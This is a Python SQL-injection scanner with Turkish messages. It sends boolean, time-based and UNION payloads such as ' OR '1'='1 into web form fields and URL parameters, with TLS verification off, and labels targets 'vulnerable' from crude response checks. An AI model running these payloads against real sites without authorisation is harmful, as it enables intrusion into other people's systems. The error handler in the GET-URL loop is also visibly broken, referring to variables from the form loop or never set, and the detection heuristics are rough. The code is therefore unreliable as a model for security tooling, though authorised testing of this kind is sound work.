import requests
import os
import json
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "sqlstate",
    "sqlite error",
    "pg_query",
    "oracle error",
    "quoted string not properly terminated"
]

def load_payloads():
    base = os.path.dirname(os.path.abspath(__file__))
    json_path = os.path.join(base, "..", "payloads.json")
    txt_path = os.path.join(base, "..", "payloads.txt")

    if os.path.exists(json_path):
        try:
            with open(json_path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print(f"[!] JSON yükleme hatası: {e}")

    elif os.path.exists(txt_path):
        print("[*] payloads.txt kullanılacak (tip: bilinmiyor)")
        with open(txt_path, "r", encoding="utf-8") as f:
            return [
                {"payload": line.strip(), "type": "unknown", "description": "TXT'den gelen"}
                for line in f if line.strip()
            ]

    print("[*] Varsayılan payloadlar kullanılacak.")
    return [
        {"payload": "' OR '1'='1", "type": "boolean-based", "description": "Varsayılan payload"},
        {"payload": "' AND SLEEP(5)--", "type": "time-based", "description": "Varsayılan payload"},
        {"payload": "' UNION SELECT null, null--", "type": "union-based", "description": "Varsayılan payload"}
    ]

def analyze_response(response, payload_info, duration):
    text = response.text.lower()
    if payload_info["type"] == "error-based":
        return any(err in text for err in SQL_ERRORS)
    elif payload_info["type"] == "time-based":
        return duration >= 5
    elif payload_info["type"] == "boolean-based":
        return "welcome" in text or "dashboard" in text
    else:
        return "sql" in text or "error" in text
def generate_reason(payload_info, response_text, duration):
    if payload_info["type"] == "error-based":
        return "Sunucudan SQL hatası döndü (örneğin syntax error), bu hata doğrudan enjeksiyona işaret eder."
    elif payload_info["type"] == "time-based" and duration >= 5:
        return "Sunucu cevabı gecikti (>=5sn), bu zaman tabanlı enjeksiyon denemesinin başarılı olabileceğini gösterir."
    elif payload_info["type"] == "boolean-based" and ("welcome" in response_text or "dashboard" in response_text):
        return "Yanıt içeriği mantıksal doğrulama (login başarılı) içeriyor; boolean tabanlı enjeksiyon başarılı olabilir."
    elif "sql" in response_text or "error" in response_text:
        return "Sayfa içeriğinde 'sql' veya 'error' ifadesi geçti, bu SQL hatası olasılığına işaret eder."
    else:
        return "Yanıt analizinde potansiyel SQL Injection belirtisi tespit edildi."

def test_targets(targets):
    payloads = load_payloads()
    results = []

    # FORM TARAMASI
    for form in targets.get("forms", [])[:3]:
        action = form.get("action")
        method = form.get("method", "get")
        inputs = form.get("inputs", [])
        full_url = urljoin(form.get("url", ""), action or "")

        for payload_info in payloads:
            for input_field in inputs:
                if not input_field.get("name"):
                    continue

                data = {i["name"]: "" for i in inputs if i.get("name")}
                data[input_field["name"]] = payload_info["payload"]

                try:
                    start = time.time()
                    if method.lower() == "post":
                        r = requests.post(full_url, data=data, timeout=5, verify=False)
                    else:
                        r = requests.get(full_url, params=data, timeout=5, verify=False)
                    duration = time.time() - start

                    is_vulnerable = analyze_response(r, payload_info, duration)
                    results.append({
                        "test": "SQL Injection",
                        "target": full_url,
                        "method": method.upper(),
                        "param": input_field["name"],
                        "payload": payload_info["payload"],
                        "type": payload_info["type"],
                        "description": payload_info["description"],
                        "status": "vulnerable" if is_vulnerable else "clean",
                        "message": "Injection başarılı" if is_vulnerable else "Belirti yok",
                        "status_code": r.status_code,
                        "response_snippet": r.text[:200].replace("\n", " ").replace("\r", "")
                    })

                except Exception as e:
                    results.append({
                        "test": "SQL Injection",
                        "target": full_url,
                        "method": method.upper(),
                        "param": input_field["name"],
                        "payload": payload_info["payload"],
                        "type": payload_info["type"],
                        "description": payload_info["description"],
                        "status": "error",
                        "message": str(e),
                        "status_code": None,
                        "response_snippet": ""
                    })

    # GET URL TARAMASI
    for url in targets.get("get_urls", []):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        for param in query:
            for payload_info in payloads:
                new_query = query.copy()
                new_query[param] = payload_info["payload"]
                encoded = urlencode(new_query, doseq=True)
                new_url = urlunparse(parsed._replace(query=encoded))

                try:
                    start = time.time()
                    r = requests.get(new_url, timeout=5, verify=False)
                    duration = time.time() - start

                    is_vulnerable = analyze_response(r, payload_info, duration)
                    results.append({
                        "test": "SQL Injection",
                        "target": new_url,
                        "method": "GET",
                        "param": param,
                        "payload": payload_info["payload"],
                        "type": payload_info["type"],
                        "description": payload_info["description"],
                        "status": "vulnerable" if is_vulnerable else "clean",
                        "message": "Injection başarılı" if is_vulnerable else "Belirti yok",
                        "status_code": r.status_code,
                        "response_snippet": r.text[:200].replace("\n", " ").replace("\r", "")
                    })

                except Exception as e:
                    results.append({
                    "test": "SQL Injection",
                    "target": full_url,
                    "method": method.upper(),
                    "param": input_field["name"],
                    "payload": payload_info["payload"],
                    "type": payload_info["type"],
                    "description": payload_info["description"],
                    "status": "vulnerable" if is_vulnerable else "clean",
                    "message": "Injection başarılı" if is_vulnerable else "Belirti yok",
                    "reason": generate_reason(payload_info, r.text.lower(), duration),
                    "status_code": r.status_code,
                    "response_snippet": r.text[:200].replace("\n", " ").replace("\r", "")
                })


    return results
